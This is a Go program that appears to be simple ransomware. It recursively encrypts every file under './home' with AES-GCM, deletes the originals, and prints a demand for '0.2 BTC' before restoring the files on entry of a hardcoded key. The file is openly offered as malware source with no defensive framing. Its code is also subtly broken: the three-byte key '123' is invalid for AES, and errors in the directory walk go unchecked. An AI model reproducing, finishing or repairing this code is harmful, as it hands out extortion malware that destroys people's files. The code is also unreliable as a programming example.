package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"io"
	"crypto/rand"
)

// Function to encrypt files
func encryptFiles(gcm cipher.AEAD) {
	// Loop through target files and encrypt them
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		// Skip if it's a directory
		if !info.IsDir() {
			// Encrypt the file
			fmt.Println("Encrypting " + path + "...")

			// Read file contents
			original, err := os.ReadFile(path)
			if err == nil {
				// Encrypt bytes
				nonce := make([]byte, gcm.NonceSize())
				io.ReadFull(rand.Reader, nonce)
				encrypted := gcm.Seal(nonce, nonce, original, nil)

				// Write encrypted contents
				err = os.WriteFile(path+".enc", encrypted, 0666)
				if err == nil {
					os.Remove(path) // Delete the original file
				} else {
					fmt.Println("Error while writing contents")
				}
			} else {
				fmt.Println("Error while reading file contents")
			}
		}
		return nil
	})
}

// Function to decrypt files
func decryptFiles(gcm cipher.AEAD) {
	// Loop through target encrypted files and decrypt them
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		// Skip if it's a directory or not an encrypted file
		if !info.IsDir() && path[len(path)-4:] == ".enc" {
			// Decrypt the file
			fmt.Println("Decrypting " + path + "...")

			// Read file contents
			encrypted, err := os.ReadFile(path)
			if err == nil {
				// Decrypt bytes
				nonce := encrypted[:gcm.NonceSize()]
				encrypted = encrypted[gcm.NonceSize():]
				original, err := gcm.Open(nil, nonce, encrypted, nil)

				// Write decrypted contents
				err = os.WriteFile(path[:len(path)-4], original, 0666)
				if err == nil {
					os.Remove(path) // Delete the encrypted file
				} else {
					fmt.Println("Error while writing contents")
				}
			} else {
				fmt.Println("Error while reading file contents")
			}
		}
		return nil
	})
}

func main() {
	// Define the decryption key as a variable
	var decryptionKey string = "123" // You can change this value as needed

	// Initialize AES in GCM mode with the hardcoded key
	key := []byte(decryptionKey)

	// Initialize AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("Error while setting up AES")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("Error while setting up GCM")
	}

	// Encrypt files automatically
	fmt.Println("Encrypting files... Please wait.")

	// Encrypt all files in the directory
	encryptFiles(gcm)

	// After encryption, inform the target that payment is required to receive the key
	fmt.Println("\nFiles have been encrypted. Please send the required payment (e.g., 0.2 BTC).")

	// Simulate the target entering the decryption key after making payment
	// In reality, this would come after payment is confirmed
	fmt.Print("\nEnter the decryption key to unlock your files: ")
	var inputKey string
	fmt.Scanln(&inputKey)

	// Validate the entered key with the variable password
	if inputKey != decryptionKey {
		fmt.Println("Invalid key! Decryption failed. Please send the correct payment and key.")
		return
	}

	// If the correct key is entered, proceed to decrypt the files
	fmt.Println("\nCorrect key entered. Decrypting files...")

	// Decrypt the encrypted files
	decryptFiles(gcm)

	fmt.Println("Decryption complete. Your files are restored.")
}
